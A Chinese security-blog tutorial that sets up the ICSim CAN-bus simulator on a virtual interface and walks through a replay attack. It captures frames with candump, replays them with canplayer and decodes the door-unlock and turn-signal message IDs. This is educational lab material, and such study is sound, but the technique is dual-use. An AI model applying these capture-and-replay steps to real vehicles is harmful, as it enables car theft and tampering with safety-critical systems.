---
title: 车联网安全入门之从CAN模拟环境搭建到重放攻击
url: https://www.anquanke.com/post/id/287021
source: 安全客-有思想的安全新媒体
date: 2023-03-07
fetch_date: 2025-10-04T08:46:38.274084
---

# 车联网安全入门之从CAN模拟环境搭建到重放攻击

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 车联网安全入门之从CAN模拟环境搭建到重放攻击

阅读量**377380**

|评论**1**

发布时间 : 2023-03-06 15:30:43

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 前言

车联网安全最近几年成为了各大汽车厂商以及安全厂商的关注热点，但是作为一个穷苦的无车一族想要入门车联网安全该怎么办？那当然是靠模拟器了

本文将介绍如何通过Ubuntu模拟车载CAN总线的收发包来进行操作学习。话不多说，芜湖，起飞🛫️～

## CAN总线介绍

### 什么是CAN总线

CAN总线又称为控制器局域网是Controller Area Network的缩写。CAn总线是一种用于实时应用的串行通讯协议总线，它可以使用双绞线来传输信号，是世界上应用最广泛的现场总线之一，在1991年呗大规模应用于汽车，从那儿以后，CAN总线成为汽车的标配。

CAN协议用于汽车中各种不同元件之间的通信，以此取代昂贵笨重的配电线束。该协议的健壮性使其用途延伸到其他自动化和工业应用。简单来说就是用来控制车辆功能的通信协议，比如车门解锁、转向灯、刹车、油门等，

### CAN总线特性

安全性：CAN是低级协议，不支持任何内在的安全功能。在标准的CAN中也没有加密，使得网络数据能被截取。在大多数应用中，应用程序需要部署自己的安全机制，例如认证传入命令或网络上某些设备的存在。若不执行适当的安全措施，其他人可能设法在总线上插入消息。尽管一些安全关键功能（如修改固件，编程键或控制防抱死制动）存在密码，但这些系统并未普遍实施，并且密钥对的数量有限。

通信机制：多主机，即每个节点都有接入总线的能力

寻址机制：消息区别，不设节点的地址，通过消息的标志符来区别消息。

帧类型：数据帧、远程帧、错误帧、超载帧、帧间隔

攻击方式：应用报文模糊攻击、DOS攻击测试、重放攻击

由于CAN总线上的数据包没有进行过任何的加密处理，因此这些数据包是能够被截取窃听。由于车载网络使用CAN协议进行通信，所以我们可以联想到车联功能也是通过CAN网络进行数据发送和交换。

## 攻击方式

CAN总线攻击方式包括应用报文模糊测试、DOS攻击测试、重放攻击等。

## 攻击实战

在接下来的文章里我们将通过模拟软件模拟真实的汽车，并对其进行重放攻击

### 实验环境

* Ubuntu16.04
* ICSim（仪表盘模拟器）
* Socketcand（CAN网络）
* Kayak（一款基于SocketCAN的CAN总线分析工具）

### 安装ICSim

安装依赖

```
# 安装依赖
sudo apt install libsdl2-dev libsdl2-image-dev can-utils maven autoconf -y
# 下载ICSim
git clone https://github.com/zombieCraig/ICSim.git
# 编译安装
cd ICSim/
sudo make
```

### 安装socketcand

```
# 下载socketcand
git clone https://github.com/linux-can/socketcand.git
cd socketcand

# 获取缺少的文件
wget https://raw.githubusercontent.com/dschanoeh/socketcand/master/config.h.in

# 编译安装
autoconf
./configure
make clean
make
sudo make install
```

### 安装Kayak

```
# 下载
git clone https://github.com/dschanoeh/Kayak.git
# 安装jdk
sudo apt-get install openjdk-8-jdk
# 安装
cd Kayak
mvn clean package
```

### 启动模拟器

```
# 设置vcan（虚拟CAN）接口
sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
```

```
# 打开仪表盘模拟器
./icsim vcan0
# 打开仪表盘控制器
./controls vcan0
```

仪表盘控制器，操作说明

| 功能 | 控制按钮 |
| --- | --- |
| 转向 | 键盘左右 |
| 速度 | 键盘上下 |
| 开/关左前车门 | 右shift/左shit+A |
| 开/关右前车门 | 右shift/左shit+B |
| 开/关左后车门 | 右shift/左shit+X |
| 开/关右后车门 | 右shift/左shit+Y |
| 开启全部车门 | 左shift+右shift |
| 关闭全部车门 | 右shift+左shift |

### 抓取CAN数据包

```
# 使用candump抓包
candump vcan0 -l
```

由于CAN在不停进行通信，故抓取到的包将会非常大

尝试重放刚才抓取到的数据包

```
canplayer -I candump-2023-01-12_151749.log
```

可以看到左前侧车门被成功打开

通过二分法我们找到了左前侧开门的数据包，如图。

```
(1673507873.514241) vcan0 19B#00000E000000
```

其中的19B是设备标识符，在数据包中查找19B

```
grep 19B candump-2023-01-12_151749.log
```

通过分析和尝试我们可知

`19B#00000E000000`为开启左前侧车门，`19B#00000F000000`为关闭所有车门

将其分解为二进制可得出16种可能的开关门组合

| 二进制 | 十六进制 |
| --- | --- |
| 0000 | 0 |
| 0001 | 1 |
| 0010 | 2 |
| 0011 | 3 |
| 0100 | 4 |
| 0101 | 5 |
| 0110 | 6 |
| 0111 | 7 |
| 1000 | 8 |
| 1001 | 9 |
| 1010 | a |
| 1011 | b |
| 1100 | c |
| 1101 | d |
| 1110 | e |
| 1111 | f |

尝试字符控制的不同车门

| 字符 | 车门 |
| --- | --- |
| 8 | 右后侧车门 |
| 4 | 左后侧车门 |
| 2 | 右前侧车门 |
| 1 | 左前侧车门 |

假设1是关门，0是开门

```
右后侧车门    左后侧车门    右前侧车门    左前侧车门
        8                 4                2                    1
        1                 0                0                    0
```

此时的值为8，结果为

至此我们就可以操控每个门的开关了。

按照同样的思路我们将转向的数据包找出来

左转向：`188#01000000`

右转向：`188#02000000`

参考链接：

<https://www.freebuf.com/articles/network/281831.html>

<https://article.itxueyuan.com/ZoxRvk>

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**Tide安全团队**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/287021](/post/id/287021)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [车联网](/tag/%E8%BD%A6%E8%81%94%E7%BD%91)

**+1**5赞

收藏

![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)Tide安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)](/member.html?memberId=142933)

[Tide安全团队](/member.html?memberId=142933)

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。

* 文章
* **83**

* 粉丝
* **71**

### TA的文章

* ##### [windows应急响应](/post/id/287417)

  2023-03-15 15:30:13
* ##### [初识内存取证-volatility与Easy\_dump](/post/id/287019)

  2023-03-08 14:30:12
* ##### [车联网安全入门之从CAN模拟环境搭建到重放攻击](/post/id/287021)

  2023-03-06 15:30:43
* ##### [Pwn入门之ret2libc详解](/post/id/286999)

  2023-03-06 10:30:35
* ##### [Windows Defender的一些渗透知识](/post/id/285521)

  2023-01-18 10:30:41

### 相关文章

* ##### [美国西雅图法院规定汽车制造商可以记录和拦截车主短信](/post/id/291299)

  2023-11-09 11:50:45
* ##### [实战助力未来｜“饶派杯”XCTF车联网安全挑战赛圆满收官！](/post/id/289027)

  2023-06-01 18:09:38
* ##### [蔚来汽车大量数据泄露，谁来保护智能汽车时代的应用安全？](/post/id/288230)

  2023-04-12 10:00:34
* ##### [汽车快速变傻？除了锤子，还有病毒！](/post/id/287054)

  2023-03-06 15:45:49
* ##### [电动汽车充电设施正成为网络攻击的新目标](/post/id/287009)

  2023-03-06 11:30:10
* ##### [互联汽车服务SiriusXM存漏洞，利用可远程攻击汽车](/post/id/284219)

  2022-12-09 14:00:11
* ##### [强化网络数据安全，工信部拟建立智能汽车网络安全制度](/post/id/282382)

  2022-10-31 14:00:47

### 热门推荐

文章目录

* [前言](#h2-0)
* [CAN总线介绍](#h2-1)
  + [什么是CAN总线](#h3-2)
  + [CAN总线特性](#h3-3)
* [攻击方式](#h2-4)
* [攻击实战](#h2-5)
  + [实验环境](#h3-6)
  + [安装ICSim](#h3-7)
  + [安装socketcand](#h3-8)
  + [安装Kayak](#h3-9)
  + [启动模拟器](#h3-10)
  + [抓取CAN数据包](#h3-11)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)